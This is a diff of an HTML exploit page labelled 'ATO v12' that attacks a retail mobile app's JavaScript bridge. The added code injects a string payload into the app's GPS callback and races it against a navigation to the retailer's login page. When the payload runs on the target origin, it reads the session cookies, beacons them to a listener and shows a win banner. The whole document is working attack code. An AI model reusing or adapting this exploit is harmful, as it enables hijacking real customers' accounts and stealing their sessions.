@@ -1,17 +1,26 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ATO-v11</title></head>
+<title>ATO-v12</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
-<h3 style="color:#c9a96e">ATO v11 (real in-place)</h3>
+<h3 style="color:#c9a96e">ATO v12 (warm GPS race)</h3>
 <div id="log"></div>
 <script>
 window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
 function B(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,650)}
+window.__p="0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 13px monospace;word-break:break-all';d.textContent='ATO-WIN('+c.length+'): '+c.substring(0,160);document.body.appendChild(d)}catch(e){}return}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=cb'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<200){try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}}})();//";
 B('load',location.href);
 if(typeof appHandler!=='undefined'){
-  // 协议相对URL: b()返回null(非http/https/sephora) + 白名单host匹配通过 → SOL redirect分支 → return false → 原地加载登录页
-  var target='https://m.sephora.cn/app/login?historyLocation='+encodeURIComponent('//m.sephora.cn/');
-  B('nav','');
-  document.getElementById('log').innerHTML='原地跳转登录页...';
-  location.href=target;
+  appHandler.appMonitorScript('getGPS',window.__p,'{}');
+  document.getElementById('log').innerHTML='GPS armed, 6s后nav';
+  var tick=0;
+  var t=setInterval(function(){
+    tick++;
+    B('hb',''+tick);
+    if(tick===3){
+      clearInterval(t);
+      B('nav','');
+      for(var i=0;i<5;i++){try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}}
+      location.href='https://m.sephora.cn/app/login?historyLocation='+encodeURIComponent('//m.sephora.cn/');
+    }
+  },2000);
 }else{B('nobridge','')}
 </script></body></html>
